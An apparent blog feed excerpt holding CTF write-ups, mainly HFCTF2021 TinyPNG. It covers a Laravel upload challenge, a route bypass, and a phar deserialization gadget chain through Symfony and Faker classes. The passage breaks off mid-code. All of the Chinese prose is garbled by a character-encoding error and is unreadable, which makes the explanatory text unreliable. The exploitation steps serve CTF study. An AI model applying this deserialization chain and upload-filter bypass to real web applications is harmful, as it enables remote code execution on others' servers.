¼å¼è¿”å›ã€‚æœŸé—´ï¼Œ html æ–‡ä»¶é‡Œçš„ js ä»£ç éƒ½ä¼šæ‰§è¡Œï¼Œä½†æ˜¯ <code>alert()</code> ä¼šå¼•èµ·æŠ¥é”™ï¼ŒåŸºæœ¬æ’é™¤äº† <code>XSS</code> çš„å¯èƒ½ã€‚ç›´æ¥ä¸Šä¼ ï¼ŒDONE!</p><p><a href="https://cdn.jsdelivr.net/npm/4qe@0.0.2/successfully_done.png"><img src="https://cdn.jsdelivr.net/npm/4qe@0.0.2/successfully_done.png" alt="successfully_done" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://cdn.jsdelivr.net/npm/4qe@0.0.2/successfully_done.png" class="lozad post-image"></a></p><p><a href="https://cdn.jsdelivr.net/npm/4qe@0.0.2/proof_of_solved.png"><img src="https://cdn.jsdelivr.net/npm/4qe@0.0.2/proof_of_solved.png" alt="proof_of_solved" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://cdn.jsdelivr.net/npm/4qe@0.0.2/proof_of_solved.png" class="lozad post-image"></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;DEFCON-2021-Quals-threefactooorx&quot;&gt;&lt;a href=&quot;#DEFCON-2021-Quals-threefactooorx&quot; class=&quot;headerlink&quot; title=&quot;DEFCON 2021 Quals threefacto</summary>
      
    
    
    
    
    <category term="CTF WriteUp" scheme="https://me.liki.link/tags/CTF-WriteUp/"/>
    
  </entry>
  
  <entry>
    <title>HFCTF2021 TinyPNG å¤ç°</title>
    <link href="https://me.liki.link/20210429/HFCTF2021-TinyPNG/"/>
    <id>https://me.liki.link/20210429/HFCTF2021-TinyPNG/</id>
    <published>2021-04-29T11:14:59.000Z</published>
    <updated>2021-05-18T11:55:25.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="HFCTF2021-TinyPNG"><a href="#HFCTF2021-TinyPNG" class="headerlink" title="HFCTF2021 TinyPNG"></a>HFCTF2021 TinyPNG</h2><p>æ„Ÿè°¢ Naivekun å¸ˆå‚…çš„å¸®åŠ©</p><p>å› ä¸ºé¢˜ç›®æ²¡æœ‰ç»™å…¨ç¯å¢ƒï¼Œæ‰€ä»¥è‡ªå·± docker æ­äº†ä¸ªç¯å¢ƒï¼Œå’Œ Buu ä¸Šçš„å¥½åƒä¸å¤ªä¸€æ ·</p><p>docker ç¯å¢ƒæˆ‘ä¼šæ”¾åœ¨æˆ‘çš„ GitHub ä¸Šï¼Œ<a href="https://github.com/ChrisLiKaiyuan/HFCTF2021_TinyPNG">å¤ç°ç¯å¢ƒ</a></p><h3 id="2021-05-18-æ›´æ–°ï¼š"><a href="#2021-05-18-æ›´æ–°ï¼š" class="headerlink" title="2021-05-18 æ›´æ–°ï¼š"></a><strong>2021-05-18 æ›´æ–°ï¼š</strong></h3><p>æ›´æ–°çš„éƒ¨åˆ†ï¼Œå¾€ä¸‹åˆ°ç»“å°¾ã€‚</p><p>ZeddYu å¸ˆå‚…è¯´å°† HTTP2 èµ°ç§çš„ç¯å¢ƒæ”¾åˆ° GitHub ä¸Šäº†ï¼Œ<a href="https://github.com/ZeddYu/HTTP-Smuggling-Lab">H2èµ°ç§ç¯å¢ƒ</a></p><h2 id="é˜…è¯»æºç "><a href="#é˜…è¯»æºç " class="headerlink" title="é˜…è¯»æºç "></a>é˜…è¯»æºç </h2><p>å…ˆé˜…è¯»æºç ï¼Œææ¸…æ¥šè¿™ä¸ª Web åº”ç”¨çš„å…·ä½“åŠŸèƒ½å’Œæµç¨‹</p><p>Laravel æ¡†æ¶çš„é»˜è®¤è·¯ç”±ä½äº <code>routes/web.php</code> ä¸‹ </p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">//...    </span><span class="token class-name static-context">Route</span><span class="token operator">::</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">view</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'upload'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name static-context">Route</span><span class="token operator">::</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token class-name static-context">IndexController</span><span class="token operator">::</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'fileUpload'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">name</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'file.upload.post'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//Don't expose the /image to others!</span><span class="token class-name static-context">Route</span><span class="token operator">::</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/image'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token class-name static-context">ImageController</span><span class="token operator">::</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'handle'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">name</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'image.handle'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ‰€ä»¥å¾ˆå®¹æ˜“å¾—åˆ°è¿™ä¸ªåº”ç”¨æœ‰ä¸‰æ¡è·¯ç”±</p><p>ç¬¬ä¸€æ¡è·¯ç”±æ˜¯è¿”å› <code>upload</code> é¡µé¢ï¼Œè§†å›¾æ–‡ä»¶ä½äº <code>resources/views/*</code></p><p>å…¶ä»–ä¸¤æ¡è·¯ç”±ï¼Œåˆ†åˆ«çœ‹ä»–ä»¬å¯¹åº”çš„ç±»å’Œæ–¹æ³•ï¼Œä½äº <code>app/Http/Controllers/*</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"># app/Http/Controllers/IndexController.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">App<span class="token punctuation">\</span>Http<span class="token punctuation">\</span>Controllers</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Http<span class="token punctuation">\</span>Request</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">IndexController</span> <span class="token keyword">extends</span> <span class="token class-name">Controller</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">fileUpload</span><span class="token punctuation">(</span><span class="token class-name type-declaration">Request</span> <span class="token variable">$req</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$allowed_extension</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"png"</span><span class="token punctuation">;</span>        <span class="token variable">$extension</span> <span class="token operator">=</span> <span class="token variable">$req</span><span class="token operator">-></span><span class="token function">file</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">clientExtension</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$extension</span> <span class="token operator">===</span> <span class="token variable">$allowed_extension</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$req</span><span class="token operator">-></span><span class="token function">file</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">getSize</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">204800</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$req</span><span class="token operator">-></span><span class="token function">file</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/&lt;\?|php|HALT\_COMPILER/i"</span><span class="token punctuation">,</span> <span class="token variable">$content</span> <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token variable">$error</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'Don\'t do that, please'</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token function">back</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                    <span class="token operator">-></span><span class="token function">withErrors</span><span class="token punctuation">(</span><span class="token variable">$error</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$fileName</span> <span class="token operator">=</span> <span class="token function"><span class="token punctuation">\</span>md5</span><span class="token punctuation">(</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'.png'</span><span class="token punctuation">;</span>                <span class="token variable">$path</span> <span class="token operator">=</span> <span class="token variable">$req</span><span class="token operator">-></span><span class="token function">file</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">storePubliclyAs</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'uploads'</span><span class="token punctuation">,</span> <span class="token variable">$fileName</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">echo</span> <span class="token string double-quoted-string">"path: <span class="token interpolation"><span class="token variable">$path</span></span>"</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token function">back</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                    <span class="token operator">-></span><span class="token function">with</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'success'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'File has been uploaded.'</span><span class="token punctuation">)</span>                    <span class="token operator">-></span><span class="token function">with</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">,</span> <span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token variable">$error</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'Don\'t do that, please'</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token function">back</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token operator">-></span><span class="token function">withErrors</span><span class="token punctuation">(</span><span class="token variable">$error</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>IndexController</code> çš„ <code>fileUpload</code> æ–¹æ³•å®ç°äº†ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ çš„åŠŸèƒ½</p><ul><li><p>ä¸Šä¼ çš„æ–‡ä»¶åç¼€ååªèƒ½ä»¥ <code>.png</code> ç»“å°¾</p></li><li><p>ä¸Šä¼ çš„æ–‡ä»¶ä¼šè¢«å­˜å‚¨åœ¨ <code>public/uploads</code>æ–‡ä»¶å¤¹å†…ï¼Œæ–‡ä»¶åä¸å¯æ§ï¼Œä¸º <code>\md5(time()) . &#39;.png&#39;</code></p></li><li><p>å¯¹ <code>&lt;?</code>ã€<code>php</code>ã€<code>HALT_COMPILER</code> å­—ç¬¦ä¸²è¿›è¡Œäº†è¿‡æ»¤</p></li><li><p>ä¸Šä¼ æˆåŠŸåä¼šè¿”å›å‚¨å­˜çš„è·¯å¾„</p></li></ul><pre class="line-numbers language-php" data-language="php"><code class="language-php"># app/Http/Controllers/ImageController.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">App<span class="token punctuation">\</span>Http<span class="token punctuation">\</span>Controllers</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Http<span class="token punctuation">\</span>Request</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ImageController</span> <span class="token keyword">extends</span> <span class="token class-name">Controller</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">handle</span><span class="token punctuation">(</span><span class="token class-name type-declaration">Request</span> <span class="token variable">$request</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$source</span> <span class="token operator">=</span> <span class="token variable">$request</span><span class="token operator">-></span><span class="token function">input</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'image'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$source</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token function">view</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'image'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$temp</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span> <span class="token variable">$source</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$extension</span> <span class="token operator">=</span> <span class="token function">end</span><span class="token punctuation">(</span><span class="token variable">$temp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$extension</span> <span class="token operator">!==</span> <span class="token string single-quoted-string">'png'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$error</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'Don\'t do that, pvlease'</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token function">back</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token operator">-></span><span class="token function">withErrors</span><span class="token punctuation">(</span><span class="token variable">$error</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$image_name</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'.png'</span><span class="token punctuation">;</span>            <span class="token variable">$dst_img</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/var/www/html/'</span> <span class="token operator">.</span> <span class="token variable">$image_name</span><span class="token punctuation">;</span>            <span class="token variable">$percent</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">imgcompress</span><span class="token punctuation">(</span><span class="token variable">$source</span><span class="token punctuation">,</span> <span class="token variable">$percent</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">compressImg</span><span class="token punctuation">(</span><span class="token variable">$dst_img</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token function">back</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">with</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'image_name'</span><span class="token punctuation">,</span> <span class="token variable">$image_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>ImageController</code> çš„ <code>handle</code> æ–¹æ³•å®ç°äº†ä¸€ä¸ªå‹ç¼©å›¾ç‰‡çš„åŠŸèƒ½</p><ul><li><strong>å®ç°äº†ï¼Œä½†åˆæ²¡æœ‰å®Œå…¨å®ç°</strong></li><li>è¯»å– Request ä¸­ä¼ å…¥çš„ <code>image</code> ä½œä¸ºç›®æ ‡å›¾ç‰‡è·¯å¾„</li><li>è¯»å–è¯¥å›¾ç‰‡ï¼Œè°ƒç”¨ <code>imgcompress</code> ç±»ä¸­çš„ <code>compressImg</code> æ–¹æ³•å¯¹å›¾ç‰‡è¿›è¡Œå‹ç¼©</li><li>å‹ç¼©å®Œæˆåè¿”å›å›¾ç‰‡çš„è·¯å¾„</li></ul><p>åœ¨æ¥çœ‹çœ‹è°ƒç”¨çš„ <code>imgcompress</code> ç±»ï¼Œå› ä¸ºæ¯”è¾ƒé•¿ï¼Œæ‰€ä»¥æˆªå–å…³é”®éƒ¨åˆ†è´´ä¸Šæ¥</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"># app/Http/Controllers/imgcompress.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">imgcompress</span><span class="token punctuation">&#123;</span><span class="token comment">//...</span>    <span class="token comment">/**     * å†…éƒ¨ï¼šæ‰“å¼€å›¾ç‰‡     */</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">_openImage</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">list</span><span class="token punctuation">(</span><span class="token variable">$width</span><span class="token punctuation">,</span> <span class="token variable">$height</span><span class="token punctuation">,</span> <span class="token variable">$type</span><span class="token punctuation">,</span> <span class="token variable">$attr</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">getimagesize</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">src</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">imageinfo</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>            <span class="token string single-quoted-string">'width'</span> <span class="token operator">=></span> <span class="token variable">$width</span><span class="token punctuation">,</span>            <span class="token string single-quoted-string">'height'</span> <span class="token operator">=></span> <span class="token variable">$height</span><span class="token punctuation">,</span>            <span class="token string single-quoted-string">'type'</span> <span class="token operator">=></span> <span class="token function">image_type_to_extension</span><span class="token punctuation">(</span><span class="token variable">$type</span><span class="token punctuation">,</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token string single-quoted-string">'attr'</span> <span class="token operator">=></span> <span class="token variable">$attr</span>        <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$fun</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"imagecreatefrom"</span> <span class="token operator">.</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">imageinfo</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">image</span> <span class="token operator">=</span> <span class="token variable">$fun</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">src</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">_thumpImage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token comment">//...</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åœ¨ <code>_openImage</code> æ–¹æ³•ä¸­ï¼Œ<code>getimagesize</code> å‡½æ•°ä¼šæ‰“å¼€ä¸€ä¸ªæ–‡ä»¶</p><p>è€Œä¸”åœ¨ PHP 4.0.5 æ”¯æŒåæ”¯æŒé€šè¿‡ URL æ‰“å¼€</p><p><img src="image-20210430115828.png" alt="image-20210430115828" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="image-20210430115828.png" class="lozad post-image"></p><p>äºæ˜¯è¿™é‡Œæˆ‘ä»¬å°±å¯ä»¥å¤¹å¸¦ç§è´§äº†ï¼Œæ¯”å¦‚è¯´ <code>phar://</code></p><h2 id="ä¿®æ´"><a href="#ä¿®æ´" class="headerlink" title="ä¿®æ´"></a>ä¿®æ´</h2><p>å…ˆçœ‹è·¯ç”± <code>routes/web.php</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token class-name static-context">Route</span><span class="token operator">::</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">view</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'upload'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name static-context">Route</span><span class="token operator">::</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token class-name static-context">IndexController</span><span class="token operator">::</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'fileUpload'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">name</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'file.upload.post'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//Don't expose the /image to others!</span><span class="token class-name static-context">Route</span><span class="token operator">::</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/image'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token class-name static-context">ImageController</span><span class="token operator">::</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'handle'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">name</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'image.handle'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¯ä»¥çœ‹åˆ° <code>//Don&#39;t expose the /image to others!</code></p><p>æ‰€ä»¥ä¿®æ´å¾ˆç®€å•ï¼Œç›´æ¥æ³¨é‡Šæ‰<code>/image</code>è·¯ç”±å³å¯</p><h2 id="æ‰“æ´"><a href="#æ‰“æ´" class="headerlink" title="æ‰“æ´"></a>æ‰“æ´</h2><p>é¢˜ç›®ç»™äº†<code>Apache</code>çš„é…ç½®æ–‡ä»¶ï¼Œå¼€å¯äº†ç›®å½•é‡å†™</p><p>æ‰€ä»¥è®¿é—®<code>/index.php/image</code>å³å¯è®¿é—®åˆ°<code>/image</code>è·¯ç”±</p><p>æˆ‘ä¸€å¼€å§‹çœ‹è¿™ä¸ªé¢˜ç›®é…äº† HTTPSï¼Œæƒ³èµ·æ¥ 4qE æ¯”èµ›ä¹‹å‰ç»™æˆ‘å‘çš„é‚£ç¯‡æ¨æ–‡ï¼Œä»¥ä¸ºè¦æ‰“ä¸€ä¸ªèµ°ç§ã€‚ç»“æœæ˜¯è¿™æ ·å°±ç»•è¿‡äº†ã€‚</p><p>ç„¶åè¿™ä¸€é¢˜å¯ä»¥ä¸Šä¼ æ–‡ä»¶ï¼Œå¯ä»¥è¯»å–æ–‡ä»¶ï¼Œæ‰“ä¸€ä¸ª <strong>phar ååºåˆ—åŒ–</strong></p><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://xz.aliyun.com/t/9318">ä¸€é“CTFé¢˜å¼•èµ·çš„å¯¹laravel v8.32.1åºåˆ—åŒ–åˆ©ç”¨é“¾æŒ–æ˜</a></p><p>é¢˜ç›®ç¯å¢ƒé‡Œç»™å‡ºäº† Laravel çš„ç‰ˆæœ¬</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token property">"require"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token property">"php"</span><span class="token operator">:</span> <span class="token string">"^7.3|^8.0"</span><span class="token punctuation">,</span>        <span class="token property">"fideloper/proxy"</span><span class="token operator">:</span> <span class="token string">"^4.4"</span><span class="token punctuation">,</span>        <span class="token property">"fruitcake/laravel-cors"</span><span class="token operator">:</span> <span class="token string">"^2.0"</span><span class="token punctuation">,</span>        <span class="token property">"guzzlehttp/guzzle"</span><span class="token operator">:</span> <span class="token string">"^7.0.1"</span><span class="token punctuation">,</span>        <span class="token property">"laravel/framework"</span><span class="token operator">:</span> <span class="token string">"^8.12"</span><span class="token punctuation">,</span>        <span class="token property">"laravel/tinker"</span><span class="token operator">:</span> <span class="token string">"^2.5"</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ‰€ä»¥ç…§æ–‡ç« æ‰¾ä¸€æ¡é“¾ä¸‹æ¥æ˜¯ä¸ªä¸é”™çš„é€‰æ‹©</p><h3 id="ImportConfigurator-ç±»"><a href="#ImportConfigurator-ç±»" class="headerlink" title="ImportConfigurator ç±»"></a>ImportConfigurator ç±»</h3><p>ç¬¬ä¸€ä¸ªæ˜¯ <code>Symfony\Component\Routing\Loader\Configurator</code> ä¸­çš„ç±» <code>ImportConfigurator</code></p><p>è¯¥ç±»å­˜åœ¨ä¸€ä¸ªåŒ…å«äº†è¯­å¥ <code>$this-&gt;xxx-&gt;xxx()</code> çš„ <code>__destruct</code> æ–¹æ³•</p><p>è¿™æ ·æˆ‘ä»¬å¯ä»¥æ§åˆ¶ <code>$this-&gt;xxx</code>ï¼Œä»è€Œæ‰§è¡Œä¸€äº›é¢„æœŸä¹‹å¤–çš„æ–¹æ³•</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment"># vendor/symfony/routing/Loader/Configurator/ImportConfigurator.php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ImportConfigurator</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$parent</span><span class="token punctuation">;</span>    <span class="token comment">//...</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">parent</span><span class="token operator">-></span><span class="token function">addCollection</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">route</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token comment">//...</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å› ä¸ºå‡½æ•°åä¸å¯æ§ï¼Œæ‰¾ä¸€ä¸ªæœ‰ <code>__call</code> æ–¹æ³•çš„ç±»</p><p>æ¯”å¦‚è¯´ <code>Faker</code> ä¸­çš„ç±» <code>ValidGenerator</code></p><h3 id="ValidGenerator-ç±»"><a href="#ValidGenerator-ç±»" class="headerlink" title="ValidGenerator ç±»"></a>ValidGenerator ç±»</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment"># vendor/fakephp/faker/src/Faker/ValidGenerator.php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ValidGenerator</span><span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span> <span class="token variable">$generator</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$validator</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$maxRetries</span><span class="token punctuation">;</span>    <span class="token comment">//...</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$arguments</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token keyword">do</span> <span class="token 